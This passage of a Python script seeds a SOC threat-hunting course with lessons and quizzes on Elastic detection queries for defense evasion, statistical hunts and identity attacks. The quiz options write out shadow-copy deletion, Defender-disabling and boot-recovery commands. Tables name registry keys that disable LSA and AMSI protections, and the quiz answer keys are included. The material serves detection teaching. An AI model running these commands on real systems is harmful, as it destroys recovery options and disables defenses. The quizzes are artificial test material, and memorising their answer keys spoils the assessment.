The path is the giveaway — adversaries name their payload `svchost.exe` and drop it in `%TEMP%` or `%PUBLIC%` to dodge name-based filters.

### .001 Invalid Code Signature

Payload signed with a stolen / unauthorised cert, or self-signed posing as a known vendor. ECS:

```kql
event.category: process
  and event.action: ("start" or "process_started")
  and process.code_signature.exists: true
  and process.code_signature.trusted: false
  and process.code_signature.subject_name: *Microsoft*
```

The combination of *signature exists*, *trust = false*, *subject_name claims Microsoft* is the textbook stolen-cert / spoofed-CN pattern.

## T1112 Modify Registry — defense evasion specifically

A few specific keys the L2 should hunt:

| Registry key | What it disables |
|---|---|
| `HKLM\\System\\CurrentControlSet\\Control\\Lsa\\RunAsPPL` | LSA Protection (PPL) — set to 0 disables |
| `HKLM\\Software\\Microsoft\\AMSI\\Providers\\*` | AMSI provider (deletion bypasses AMSI) |
| `HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\\UseLogonCredential` | WDigest plaintext-credential caching (set to 1 re-enables Win7-era plaintext caching) |
| `HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\*` | Defender policy override |

EQL hunt against `logs-endpoint.events.registry-*`:

```eql
registry where event.action == "modification"
  and registry.path : ("*\\\\AMSI\\\\Providers\\\\*",
                        "*\\\\Lsa\\\\RunAsPPL*",
                        "*\\\\WDigest\\\\UseLogonCredential*",
                        "*\\\\Windows Defender\\\\*")
```

A modification to any one of these is a strong evasion signal; chained modifications across the cluster within a short window indicates active credential-access preparation.

## T1140 Deobfuscate, T1497 Sandbox Evasion — recognise

- **T1140 Deobfuscate/Decode Files or Information** — the second-stage pattern. A small stager pulls a base64/AES-encrypted blob and decrypts it in memory. Telemetry: high-entropy strings in command lines, .NET reflective loads, AMSI-captured deobfuscated content (PowerShell EID 4104).
- **T1497 Virtualisation/Sandbox Evasion** — malware checks for VM artefacts (`vmtoolsd`, `vboxservice`) before executing payload. Less directly L1/L2-actionable but flagged in EDR triage notes.

## Glossary

- **EID 1102** — Security log cleared (T1070.001); rare in normal ops, page-IR signal.
- **`file.mtime < file.created`** — timestomp fingerprint (T1070.006).
- **PPL / LSA Protection** — Process Protected Light; protects LSASS from non-protected-process access. Disabled via `HKLM\\System\\...\\Lsa\\RunAsPPL`.
- **WDigest plaintext re-enable** — adversary re-enables Win7-era plaintext-credential caching to harvest passwords from LSASS without dumping.
- **`sample by host.name`** — EQL primitive for unordered correlation; ideal for the "all of these tools fired in any order" cluster signal.

## Further reading

- ATT&CK technique pages — T1027, T1070, T1562, T1036, T1112, T1140.
- Microsoft docs — *Configure RunAsPPL* (LSA Protection).
- Elastic Security prebuilt-rule library — Defense Evasion EQL rules.
""",
    )
    m3l3q = _add_lesson(
        session, mod3, order=6, title="Defense Evasion — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on T1070 log-clear severity, T1036 masquerading-by-path, the T1562 / vssadmin ransomware pre-encryption cluster, and the timestomp fingerprint.",
    )
    _add_q(session, m3l3q, order=1, kind=QuestionKind.SINGLE,
        stem_md="Windows Event ID **1102** (the Security event log was cleared) appears unattributed on a production host. What is the correct L2 reading?",
        options=[
            {"value": "info", "label": "Tag as informational; log clearing is routine"},
            {"value": "monitor", "label": "Open a low-severity ticket and monitor for follow-on activity"},
            {"value": "page", "label": "Treat as a page-IR signal — unattributed Security log clearing is a high-confidence T1070.001 indicator-removal action; it is rare in normal operations and frequently appears as a pre-encryption / pre-cleanup adversary action"},
            {"value": "tune", "label": "Submit a tuning ticket — the rule must be FP-rich"},
        ],
        correct="page",
        explanation_md="EID 1102 is rare in legitimate operations (Group Policy enforces retention; admins rarely clear logs ad-hoc). When it fires unattributed, it is a textbook T1070.001 *Clear Windows Event Logs* signal — frequently pre-encryption tradecraft to remove forensic artefacts. Page IR; do not monitor.",
        points=2,
    )
    _add_q(session, m3l3q, order=2, kind=QuestionKind.SINGLE,
        stem_md="Which of the following ECS predicates best fingerprints **T1036.005 Masquerading: Match Legitimate Name or Location** for a process called `svchost.exe`?",
        options=[
            {"value": "name", "label": "`process.name: svchost.exe` is sufficient"},
            {"value": "hash", "label": "`process.hash.sha256` differs from the known good"},
            {"value": "path", "label": "`process.name: svchost.exe AND NOT process.executable: (\"C:\\\\Windows\\\\System32\\\\*\" OR \"C:\\\\Windows\\\\SysWOW64\\\\*\")` — the *path* is the giveaway, not the name"},
            {"value": "user", "label": "The process is running as `SYSTEM`"},
        ],
        correct="path",
        explanation_md="T1036.005 by definition keeps the *legitimate name* (`svchost.exe`) but moves the binary to a non-system location (`%TEMP%`, `%PUBLIC%`, `%APPDATA%`). Path-based exclusion of System32 / SysWOW64 catches the masquerade. Hash-based detection works but only against known-bad samples; path-based catches novel ones.",
        points=2,
    )
    _add_q(session, m3l3q, order=3, kind=QuestionKind.MULTI,
        stem_md="Which of the following process events, occurring on the same host within minutes of each other, fingerprint a **ransomware pre-encryption** evasion + impact cluster (combination of T1562 + T1490 / T1489)?",
        options=[
            {"value": "set_mp", "label": "`Set-MpPreference -DisableRealtimeMonitoring $true`"},
            {"value": "sc_stop", "label": "`sc stop Sense` (Defender for Endpoint sensor)"},
            {"value": "vss", "label": "`vssadmin delete shadows /all /quiet`"},
            {"value": "bcdedit", "label": "`bcdedit /set {default} recoveryenabled No`"},
            {"value": "ipconfig", "label": "`ipconfig /all`"},
        ],
        correct=["set_mp", "sc_stop", "vss", "bcdedit"],
        explanation_md="`Set-MpPreference -DisableRealtimeMonitoring` and `sc stop Sense` are T1562.001 (impair defenses); `vssadmin delete shadows` and `bcdedit recoveryenabled No` are T1490 (inhibit system recovery). Three or four of these chained within minutes is a *page-IR* ransomware-staging signal — the encryption phase is typically 2–10 minutes away. `ipconfig /all` is a discovery command (T1016) — common on its own, not a cluster signal here.",
        points=3,
    )
    _add_q(session, m3l3q, order=4, kind=QuestionKind.SHORTANSWER,
        stem_md="A file's `file.mtime` (last-modified time) is *earlier* than its `file.created` time. Which ATT&CK sub-technique does this fingerprint? (T-number plus short name.)",
        options=None,
        correct=["T1070.006", "t1070.006", "T1070.006 timestomp", "timestomp", "T1070.006 timestomping"],
        explanation_md="**T1070.006 Timestomp** — the modify-time precedes creation-time, which is impossible in normal filesystem semantics. Adversaries set `mtime` backwards (often to match a benign system file's date) to evade timeline-analysis. The hunt `WHERE file.mtime < file.created` catches it directly.",
        points=2,
    )

    # Lesson 3.4 — Statistical hunts + cross-source pivots + capstone
    m3l4 = _add_lesson(
        session, mod3, order=7,
        title="Statistical hunts in ES|QL, cross-source pivots, and a worked end-to-end capstone",
        lesson_type=LessonType.READING, duration_min=26,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Author **rare-process** and **rare-parent-child-pair** hunts in ES|QL using `COUNT_DISTINCT` and `COUNT`
> 2. Compute a **command-line entropy proxy** with ES|QL `EVAL` and `LENGTH`/`REPLACE`
> 3. Hunt **signed-vs-unsigned ratio anomalies** per host
> 4. Surface **time-of-day anomalies** with `BUCKET()` and per-host baselining
> 5. Pivot between Elastic Agent and Sysmon sources in a single multi-index query
> 6. Walk the worked **PEAK capstone** for *encoded PowerShell from Office parent* end-to-end and produce a Kibana Security EQL detection-rule body

## Statistical hunts — when single-event filters miss

A single-event filter answers *"is X present?"* A statistical hunt answers *"is X *unusual* given my baseline?"* This is the hunting-maturity-model HM3 work: the L2 produces detections that fire on *deviation from expected behaviour*, not just on known-bad strings.

### Rare-process by SHA256

Hunt the long tail — processes seen on ≤ N hosts, low invocation count, not signed by a known publisher. Likely to be either a tooling rarity (developer-laptop one-off) or a novel adversary payload.

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 30d AND host.os.family == "windows"
| STATS host_count = COUNT_DISTINCT(host.name),
        invocation_count = COUNT(),
        sample_paths = VALUES(process.executable),
        signed_status = VALUES(process.code_signature.status)
  BY process.hash.sha256, process.name
| WHERE host_count <= 3 AND invocation_count <= 10
| WHERE NOT signed_status == "trusted"
| SORT invocation_count ASC
| LIMIT 200
```

### Rare parent-child pair

`(process.parent.name, process.name)` pairs that are unusual fleet-wide. The `outlook.exe → cmd.exe` pair is rare on most fleets — when it appears, it's worth investigating.

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 30d
| STATS pair_count = COUNT(),
        host_count = COUNT_DISTINCT(host.name)
  BY process.parent.name, process.name
| WHERE pair_count < 50 AND host_count < 5
| SORT pair_count ASC
| LIMIT 100
```

The threshold (`pair_count < 50 AND host_count < 5`) is fleet-size-dependent. Re-baseline per estate.

### Command-line entropy proxy

Approximate command-line entropy via special-character density. Useful for catching Invoke-Obfuscation outputs without running real entropy at query time:

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 7d
  AND process.name IN ("powershell.exe", "pwsh.exe", "cmd.exe", "wscript.exe", "cscript.exe")
| EVAL cmd_len = LENGTH(process.command_line)
| EVAL specials = LENGTH(process.command_line) -
                  LENGTH(REPLACE(REPLACE(REPLACE(process.command_line, "^", ""), "`", ""), "$", ""))
| EVAL density = TO_DOUBLE(specials) / TO_DOUBLE(cmd_len)
| WHERE cmd_len > 300 AND density > 0.05
| KEEP @timestamp, host.name, user.name, process.name, process.command_line, cmd_len, density
| SORT density DESC
| LIMIT 200
```

### Signed-vs-unsigned ratio per host

Hosts whose proportion of unsigned-binary invocations spikes anomalously over the baseline. Catches a scenario where a wave of dropped-payload activity hits one host while the rest of the estate looks normal.

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 7d AND host.os.family == "windows"
| EVAL is_unsigned = CASE(process.code_signature.trusted == true, 0, 1)
| STATS total = COUNT(),
        unsigned = SUM(is_unsigned)
  BY host.name, BUCKET(@timestamp, 1d)
| EVAL unsigned_ratio = TO_DOUBLE(unsigned) / TO_DOUBLE(total)
| WHERE total > 100 AND unsigned_ratio > 0.30
| SORT unsigned_ratio DESC
| LIMIT 100
```

A 30% unsigned-ratio is the threshold for further investigation; on most well-managed Windows fleets the steady-state ratio is below 5%.

### Time-of-day anomalies

Process invocations at hours when the host historically has no activity. The ES|QL form uses `BUCKET()` and per-host baselining:

```esql
FROM logs-endpoint.events.process-*
| WHERE @timestamp > NOW() - 30d
  AND process.name IN ("powershell.exe", "pwsh.exe", "cmd.exe")
| EVAL hour_of_day = DATE_EXTRACT("HOUR_OF_DAY", @timestamp)
| STATS event_count = COUNT() BY host.name, hour_of_day
| WHERE event_count > 0 AND (hour_of_day < 6 OR hour_of_day > 22)
| SORT event_count DESC
| LIMIT 100
```

Combine with a host-baseline subquery (or a follow-up enrichment step) to suppress hosts that legitimately operate overnight (servers in different time zones).

## Cross-source pivots — Elastic Agent vs Sysmon

When both sources are present:

```esql
FROM logs-endpoint.events.process-*, winlogbeat-*
| WHERE @timestamp > NOW() - 7d
  AND (event.action IN ("start", "process_started")
       OR event.code == "1"           // Sysmon
       OR event.code == "4688")       // native
  AND process.name == "powershell.exe"
| STATS event_count = COUNT(),
        sources = VALUES(event.dataset)
  BY host.name
```

`event.dataset` typically resolves to `endpoint.events.process` (Elastic Agent) or `winlogbeat.sysmon` / `winlogbeat.security` (Winlogbeat) — surfacing which source produced each event. The L2 reflex when results look thin: confirm both sources are populating; sometimes Elastic Agent endpoint integration is enabled but Sysmon's command-line capture is configured differently.

## The PEAK capstone — encoded PowerShell from Office parent

A complete L2-grade hunt walked end-to-end, from hypothesis to detection-rule submission.

### Prepare

**Hypothesis (four-element from M1):** *In the past 30 days, an adversary has used T1059.001 PowerShell with `-EncodedCommand` from an Office process parent on at least one endpoint, observable in `logs-endpoint.events.process-*` where `process.parent.name` is one of the Office binaries and `process.command_line` contains a base64-shape encoded command.*

- **Hypothesis type:** TTP-based.
- **ATT&CK mapping:** T1059.001 + T1027.010 + T1204.002.
- **Data sources:** `logs-endpoint.events.process-*`, `winlogbeat-*`, optionally `winlog.channel: "Microsoft-Windows-PowerShell/Operational"` for EID 4104.
- **Window:** explicit UTC.
- **Navigator coverage:** check the team's existing layer; expect *red* if no current detection.

### Execute

**Q1 broad** — KQL in Discover:

```kql
event.category: process
  and event.action: ("start" or "process_started")
  and process.name: ("powershell.exe" or "pwsh.exe")
  and process.command_line: (*-EncodedCommand* or *-enc * or *FromBase64String*)
```

**Q2 narrow** — add the Office parent:

```kql
event.category: process
  and event.action: ("start" or "process_started")
  and process.name: ("powershell.exe" or "pwsh.exe")
  and process.command_line: (*-EncodedCommand* or *-enc * or *FromBase64String*)
  and process.parent.name: ("WINWORD.EXE" or "EXCEL.EXE" or "POWERPNT.EXE" or "OUTLOOK.EXE")
```

**Q3 enrichment** — EQL `sequence` for the click-context:

```eql
sequence by host.name with maxspan=5m
  [ process where process.name : ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE") ]
  [ process where process.name : ("powershell.exe", "pwsh.exe")
              and process.command_line : ("*-EncodedCommand*", "*-enc *", "*FromBase64String*") ]
```

**Q4 disposition** — ES|QL aggregation for triage-grade output:

```esql
FROM logs-endpoint.events.process-*, winlogbeat-*
| WHERE @timestamp > NOW() - 30d
  AND KQL("process.name: (powershell.exe or pwsh.exe)
          AND process.command_line: (*EncodedCommand* or *FromBase64String* or *DownloadString*)
          AND process.parent.name: (WINWORD.EXE or EXCEL.EXE or POWERPNT.EXE or OUTLOOK.EXE)")
| STATS event_count = COUNT(),
        users = VALUES(user.name),
        parents = VALUES(process.parent.command_line),
        first_seen = MIN(@timestamp),
        last_seen = MAX(@timestamp)
  BY host.name, BUCKET(@timestamp, 1h)
| SORT event_count DESC
| LIMIT 100
```

### Act

Disposition the survivor list:

- TPs → IR handoff per Module 1.
- BTPs → record the legitimate-tooling pattern (e.g. some IT-automation scripts use `Outlook.exe` COM-automation legitimately; document the FP-class and add to the rule whitelist on conversion).
- FPs → refine the query.
- Inconclusive → out-of-band verification.

### Know

Update the team's Navigator coverage from red → orange (hunting coverage) and propose the detection rule.

### The detection-rule body

The Q3 EQL `sequence` becomes the rule body in Kibana Security:

```eql
sequence by host.name with maxspan=5m
  [ process where process.name : ("WINWORD.EXE", "EXCEL.EXE", "POWERPNT.EXE", "OUTLOOK.EXE") ]
  [ process where process.name : ("powershell.exe", "pwsh.exe")
              and process.command_line : ("*-EncodedCommand*", "*-enc *", "*FromBase64String*",
                                          "*DownloadString*", "*Invoke-Expression*", "*IEX *")
              and not user.name : ("svc_*", "admin_*") ]
```

Metadata for the rule: severity *high*; threat tactic `TA0002 Execution`; technique `T1059.001` + `T1204.002`; runbook reference; owner team; data source dependency.

After 90 days of FP-rate measurement and whitelist refinement, Navigator transitions orange → yellow → green. The hunt cycle closes.

## Glossary

- **Rare-process / rare-pair / entropy / signed-ratio / time-of-day** — the five canonical statistical-hunt patterns.
- **`BUCKET()`** — ES|QL time-bucketing function; the workhorse for time-series anomaly hunts.
- **Cross-source pivot** — querying `logs-endpoint.events.process-*` and `winlogbeat-*` together via multi-index `FROM`.
- **Detection-rule body** — the EQL `sequence` (or ES|QL pipeline) that becomes a Kibana Security rule with no rewriting.

## Further reading

- Elastic docs — *Kibana Security detection rules* (EQL rule type, ES|QL rule type from 8.13).
- ION's TIDE integration — the L2's hand-off path for converted hunts (covered in L2 Module 8 capstone).
- ATT&CK Navigator — for the team's coverage layer.
""",
    )
    m3l4q = _add_lesson(
        session, mod3, order=8, title="Statistical hunts & capstone — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on the rare-process pattern, signed-ratio anomaly, the cross-source `event.action`/`event.code` disjunction, and the EQL detection-rule body shape.",
    )
    _add_q(session, m3l4q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 wants to hunt the *long tail* — Windows process binaries that are present on a small number of hosts, run rarely, and are *not* signed by a trusted publisher. Which ES|QL aggregation pattern is canonical?",
        options=[
            {"value": "all", "label": "Just `STATS COUNT() BY process.name` and look at the bottom of the list"},
            {"value": "rare", "label": "`STATS host_count = COUNT_DISTINCT(host.name), invocation_count = COUNT(), signed_status = VALUES(process.code_signature.status) BY process.hash.sha256, process.name | WHERE host_count <= 3 AND invocation_count <= 10 AND NOT signed_status == \"trusted\"`"},
            {"value": "process_only", "label": "`STATS COUNT() BY process.name | WHERE COUNT() < 5`"},
            {"value": "name_filter", "label": "Filter by suspicious process names (`powershell.exe`, `cmd.exe`) and aggregate"},
        ],
        correct="rare",
        explanation_md="The canonical *rare-process by SHA256* pattern keys aggregation on the hash (not the name — adversaries rename), counts both the host fan-out and the total invocations, and excludes trusted-signed binaries. The combination of *low host_count + low invocation_count + not-trusted-signed* is the high-signal long-tail filter.",
        points=2,
    )
    _add_q(session, m3l4q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are valid ES|QL idioms for **statistical / anomaly hunting** on process events?",
        options=[
            {"value": "bucket", "label": "Use `BUCKET(@timestamp, 1h)` for time-bucketing inside `STATS BY`"},
            {"value": "case_unsigned", "label": "`EVAL is_unsigned = CASE(process.code_signature.trusted == true, 0, 1)` then `SUM(is_unsigned)` for a per-host unsigned-ratio"},
            {"value": "entropy_proxy", "label": "Compute a special-character density via `LENGTH` minus `LENGTH(REPLACE(...))` as an entropy proxy"},
            {"value": "join_inline", "label": "Use `LOOKUP JOIN` against a small enrich-policy index for asset-criticality joins"},
            {"value": "sequence", "label": "Use `SEQUENCE BY host.name WITH MAXSPAN=5m` for behavioural-chain correlation in ES|QL"},
        ],
        correct=["bucket", "case_unsigned", "entropy_proxy", "join_inline"],
        explanation_md="The trap is the last option. `sequence` is **EQL's** primitive, not ES|QL's — ES|QL has no behavioural-chain operator yet (as of 8.16). For chains, switch to EQL. The other four are correct ES|QL statistical-hunt idioms.",
        points=3,
    )
    _add_q(session, m3l4q, order=3, kind=QuestionKind.SINGLE,
        stem_md="An L2 writes an ES|QL multi-index query against both Elastic Agent endpoint integration and Winlogbeat+Sysmon to catch process-create events from either source. What's the correct disjunction in the `WHERE` clause to cover *both* schemas?",
        options=[
            {"value": "act_only", "label": "`event.action IN (\"start\", \"process_started\")` only"},
            {"value": "code_only", "label": "`event.code == \"1\"` only"},
            {"value": "disj", "label": "`event.action IN (\"start\", \"process_started\") OR event.code == \"1\" OR event.code == \"4688\"` — Elastic Agent uses `event.action`; Sysmon EID 1 surfaces as `event.code: \"1\"`; native Windows EID 4688 surfaces as `event.code: \"4688\"`"},
            {"value": "name_only", "label": "Filter only by `process.name`"},
        ],
        correct="disj",
        explanation_md="The three sources expose process-create through different fields: `event.action` (Elastic Agent), `event.code: \"1\"` (Sysmon EID 1), `event.code: \"4688\"` (native Windows). A multi-index hunt needs the disjunction to cover all three. Filtering only by `process.name` works but loses the schema-specific context that downstream `STATS` may need.",
        points=2,
    )
    _add_q(session, m3l4q, order=4, kind=QuestionKind.TRUEFALSE,
        stem_md="The EQL `sequence` query authored as a hunt's *Q3 enrichment* step in PEAK can become the body of a Kibana Security EQL detection rule with **no rewriting** — the same query that found the hunt finding fires the rule. Whitelisting and metadata are added on conversion.",
        options=[{"value": "true", "label": "True"}, {"value": "false", "label": "False"}],
        correct="true",
        explanation_md="**True.** Kibana Security's EQL rule type accepts an EQL `sequence` body directly. The L2's hunt query *is* the candidate rule body. The five-gate hand-off (M1 Lesson 4) adds FP-rate measurement, whitelist filters, severity / runbook / owner metadata, the TIDE submission, and the lifecycle plan — but the *query body* itself doesn't change. This 1:1 hunt-to-detection mapping is the architectural reason EQL is the preferred chain-rule language for Elastic Security.",
        points=2,
    )

    # ── Module 4 — Identity & sign-in: Credential Access + Lateral Movement
    mod4 = _add_module(
        session, course, order=4,
        title="Identity & sign-in — Credential Access + Lateral Movement",
        description_md=(
            "Hunting on the identity plane. Windows Security log auth "
            "events (4624 / 4625 / 4768 / 4769 / 4662 / 4720); Entra "
            "ID / Azure AD sign-in logs (`logs-azure.signinlogs-*`) and "
            "the AiTM `session_id` reuse pattern; **Credential Access "
            "(TA0006)** — T1003 OS dumping (LSASS / SAM / NTDS / "
            "DCSync), T1110 brute force, T1539 cookie theft, T1187 "
            "forced auth, T1558 Kerberos ticket forging (Kerberoast / "
            "AS-REP roast / Golden / Silver), T1621 MFA bombing; "
            "**Lateral Movement (TA0008)** — T1021 RDP / SMB / DCOM / "
            "WinRM / SSH / VNC, T1570 lateral tool transfer, T1550 "
            "Pass-the-Hash / Pass-the-Ticket, T1210 remote-service "
            "exploitation. Cloud-identity AiTM signals; worked PEAK "
            "capstone for *Kerberoasting → Lateral RDP → DCSync* end "
            "to end with a Kibana Security EQL detection-rule body."
        ),
        estimated_minutes=240,
    )

    # Lesson 4.1 — Identity-event data plane + ECS reference
    m4l1 = _add_lesson(
        session, mod4, order=1,
        title="The identity-event data plane in Elastic and the auth-event ECS reference",
        lesson_type=LessonType.READING, duration_min=24,
        content_md="""
> **Learning objectives.** By the end of this lesson you'll be able to:
> 1. Recognise the **on-prem auth events** in `winlogbeat-*` — 4624 / 4625 / 4768 / 4769 / 4662 / 4720 / 4738 / 4776 — and what each tells the L2
> 2. Read the **Windows logon types** (2 / 3 / 4 / 5 / 7 / 9 / 10 / 11) and their security implications
> 3. Pivot to **Entra ID / Azure AD sign-in logs** in `logs-azure.signinlogs-*` and read `azure.signinlogs.properties.*` fields
> 4. Recognise `risk_event_types_v2` values and use them as hunt anchors
> 5. Cross-pivot between on-prem AD events and cloud Entra events keyed on `user.name`
>
> **Prerequisites.** L2 Modules 1–3.

## The two halves of the identity plane

A modern enterprise's identity plane straddles on-prem and cloud:

- **On-prem** — Active Directory and the Windows Security log. Surfaces in `winlogbeat-*` (Windows Event Forwarding + Winlogbeat) or `logs-system.security-*` (Elastic Agent Windows integration). The classical 4624 / 4625 / 4768 / 4769 / 4662 cluster.
- **Cloud** — Entra ID (Azure AD), Okta, Google Workspace. Surfaces via the relevant Elastic integration: `logs-azure.signinlogs-*` (interactive + non-interactive sign-ins), `logs-azure.auditlogs-*` (admin actions), `logs-okta.system-*` (Okta system log).

A real intrusion frequently crosses the line — phishing → cloud sign-in (cloud) → device registration (cloud) → *on-prem-synced device* → lateral movement (on-prem). The L2 must hunt across both and know how to join them.

## On-prem auth events — the canonical set

| Event Code | What it means | Hunt value |
|---|---|---|
| **4624** | Successful logon | The workhorse. `LogonType` discriminates how |
| **4625** | Failed logon | Brute-force / spray clusters; account-lockout pattern |
| **4634** / **4647** | Logoff | Pair with 4624 to compute session length |
| **4672** | Special privileges assigned | Admin sign-in fingerprint |
| **4720** | User account created | T1136 |
| **4732** / **4728** | Member added to local / domain group | T1098 (privilege esc) |
| **4738** | User account changed | Password change, SPN change, trust change |
| **4768** | Kerberos TGT issued | AS-REP Roasting hunts here |
| **4769** | Kerberos TGS issued | Kerberoasting hunts here |
| **4776** | NTLM credential validation | Pass-the-Hash anchor |
| **4662** | Directory access | DCSync hunt with the replication GUID |
| **4778** / **4779** | RDP reconnect / disconnect | Lateral movement T1021.001 |

### Windows logon types — the 2/3/10 reflex

`winlog.event_data.LogonType` is the discriminator on 4624:

| Type | Name | What it means | L2 reading |
|---|---|---|---|
| **2** | Interactive | Console logon | Local user at the keyboard |
| **3** | Network | SMB / file share / RPC remote | Lateral SMB to admin shares |
| **4** | Batch | Scheduled task | Often `SYSTEM` |
| **5** | Service | Service started | Service context |
| **7** | Unlock | Unlock screensaver | Routine |
| **8** | NetworkCleartext | Network with cleartext password | Legacy / IIS basic auth |
| **9** | NewCredentials | `runas /netonly` | Pass-the-Hash classical pattern |
| **10** | RemoteInteractive | RDP | T1021.001 lateral |
| **11** | CachedInteractive | Cached domain logon | Offline laptop |

**Rule of thumb**: LT3 + admin account from non-DC source = SMB lateral. LT9 from a workstation = PtH candidate. LT10 from external IP = RDP-from-internet (or VPN).

KQL for SMB lateral pattern:

```kql
event.code: "4624"
  and winlog.event_data.LogonType: "3"
  and winlog.event_data.TargetUserName: ("Administrator" or "Admin*" or "*-adm")
  and not winlog.event_data.IpAddress: ("-" or "::1" or "127.0.0.1")
```

## ECS field reference for identity hunts

| Category | Field |
|---|---|
| User identity | `user.name`, `user.domain`, `user.id`, `user.target.name`, `user.target.domain` |
| Source | `source.ip`, `source.user.name`, `source.address` |
| Host | `host.name`, `host.ip`, `host.os.family` |
| Event | `event.action`, `event.category` (= `authentication`), `event.code`, `event.outcome` (`success` / `failure`) |
| Windows-specific | `winlog.event_id`, `winlog.event_data.LogonType`, `winlog.event_data.TargetUserName`, `winlog.event_data.IpAddress`, `winlog.event_data.LogonProcessName`, `winlog.event_data.AuthenticationPackageName`, `winlog.event_data.TicketEncryptionType`, `winlog.event_data.ServiceName`, `winlog.event_data.Properties` |
| Cloud (Azure) | `azure.signinlogs.properties.user_principal_name`, `azure.signinlogs.properties.ip_address`, `azure.signinlogs.properties.app_display_name`, `azure.signinlogs.properties.client_app_used`, `azure.signinlogs.properties.authentication_requirement`, `azure.signinlogs.properties.risk_level_during_sign_in`, `azure.signinlogs.properties.risk_event_types_v2`, `azure.signinlogs.properties.session_id`, `azure.signinlogs.properties.correlation_id`, `azure.signinlogs.properties.device_detail.browser`, `azure.signinlogs.properties.device_detail.operating_system`, `azure.signinlogs.properties.device_detail.trust_type`, `azure.signinlogs.properties.location.country_or_region`, `azure.signinlogs.properties.location.city` |

## Entra ID sign-in logs — the cloud half

Entra sign-in logs surface in `logs-azure.signinlogs-*`. The fields the L2 reaches for daily:

- **`properties.user_principal_name`** — the UPN (e.g. `alex@corp.onmicrosoft.com`).
- **`properties.app_display_name`** — the application the user signed into (`Microsoft Office`, `Office 365 Exchange Online`, etc.).
- **`properties.client_app_used`** — `Browser`, `Mobile Apps and Desktop clients`, `IMAP4`, `POP3`, `Authenticated SMTP`, `Other clients`. *Legacy auth* is the latter four — flag for hunts.
- **`properties.authentication_requirement`** — `singleFactorAuthentication` / `multiFactorAuthentication`.
- **`properties.risk_level_during_sign_in`** — `none` / `low` / `medium` / `high`.
- **`properties.risk_event_types_v2`** — array of risk reasons. The values an L2 must recognise:
  - `unfamiliarFeatures`
  - `anonymizedIPAddress` (Tor / VPN)
  - `maliciousIPAddress`
  - `unlikelyTravel` ("impossible travel")
  - `passwordSpray`
  - `tokenIssuerAnomaly`
  - `suspiciousBrowser`
  - `riskyIPAddress`
  - `mcasImpossibleTravel`
  - `mcasFinSuspiciousInboxManipulationRules`
  - `tokenIssuedFromAnonymousIP`
  - `mcasSuspiciousOAuthAppFileDownloadActivities`
  - `anomalousToken`, `anomalousUserActivity`
- **`properties.session_id`** — the gold field for AiTM detection.
- **`properties.correlation_id`** — request-correlation ID for Entra request tracing.

KQL for high-risk sign-ins in the last 24h:

```kql
event.dataset: "azure.signinlogs"
  and azure.signinlogs.properties.risk_level_during_sign_in: ("high" or "medium")
  and @timestamp >= "now-24h"
```

ES|QL aggregation by user with risk-event types:

```esql
FROM logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 7d
  AND azure.signinlogs.properties.risk_level_during_sign_in IN ("high", "medium")
| STATS event_count = COUNT(),
        risk_types = VALUES(azure.signinlogs.properties.risk_event_types_v2),
        ips = VALUES(azure.signinlogs.properties.ip_address)
  BY azure.signinlogs.properties.user_principal_name
| SORT event_count DESC
| LIMIT 100
```

## Cross-pivot — on-prem ↔ cloud

The most common cross-pivot pattern: a cloud sign-in flagged with `risk_level_during_sign_in: "high"` for `user.name = alex@corp` followed by an on-prem 4624 LT10 (RDP) for the same user from the same source IP — confirming the cloud takeover translated to on-prem access.

ES|QL multi-index hunt:

```esql
FROM winlogbeat-*, logs-azure.signinlogs-*
| WHERE @timestamp > NOW() - 24h
  AND (event.code == "4624" OR event.dataset == "azure.signinlogs")
  AND user.name == "alex"
| STATS event_count = COUNT(),
        sources = VALUES(source.ip),
        kinds = VALUES(event.dataset)
  BY user.name, BUCKET(@timestamp, 1h)
```

## Glossary

- **LogonType 2 / 3 / 9 / 10** — interactive / network (SMB) / NewCredentials (PtH) / RemoteInteractive (RDP).
- **`session_id`** — Entra sign-in field; same value reused from new IP/UA = AiTM cookie replay.
- **`risk_event_types_v2`** — Entra-side anomaly signals; the L2's first cloud-hunt anchor.
- **Cross-pivot** — on-prem AD ↔ cloud Entra hunt joined on `user.name` and time window.

## Further reading

- Microsoft Learn — *Audit Account Logon Events*.
- Elastic docs — *Azure integration* (`logs-azure.*` indices).
- ATT&CK technique pages T1003 / T1110 / T1558 / T1021 / T1550.
""",
    )
    m4l1q = _add_lesson(
        session, mod4, order=2, title="Identity data plane — quiz",
        lesson_type=LessonType.QUIZ, duration_min=8,
        content_md="Four questions on logon-type discrimination, cross-source pivots, Entra risk_event_types_v2, and the session_id field.",
    )
    _add_q(session, m4l1q, order=1, kind=QuestionKind.SINGLE,
        stem_md="An L2 sees a 4624 successful-logon event with `winlog.event_data.LogonType: \"9\"` against a workstation, sourced from another non-DC workstation in the same VLAN. Which pattern does this most precisely fingerprint?",
        options=[
            {"value": "interactive", "label": "Interactive console logon (LT2)"},
            {"value": "rdp", "label": "RDP lateral (LT10)"},
            {"value": "pth", "label": "Pass-the-Hash candidate — `runas /netonly` / `NewCredentials` logon type"},
            {"value": "service", "label": "Service start (LT5)"},
        ],
        correct="pth",
        explanation_md="LogonType 9 (`NewCredentials`) is the `runas /netonly` / Pass-the-Hash classical fingerprint — it's how an attacker uses a stolen NTLM hash to authenticate to a remote resource without needing the plaintext password. LT9 from a workstation against an admin account from a non-DC source is a high-confidence T1550.002 signal.",
        points=2,
    )
    _add_q(session, m4l1q, order=2, kind=QuestionKind.MULTI,
        stem_md="Which of the following are values an L2 should recognise in `azure.signinlogs.properties.risk_event_types_v2` as anomaly anchors for cloud-identity hunts?",
        options=[
            {"value": "anon_ip", "label": "`anonymizedIPAddress` — Tor / VPN exit"},
            {"value": "malicious_ip", "label": "`maliciousIPAddress` — Microsoft-flagged known-bad"},
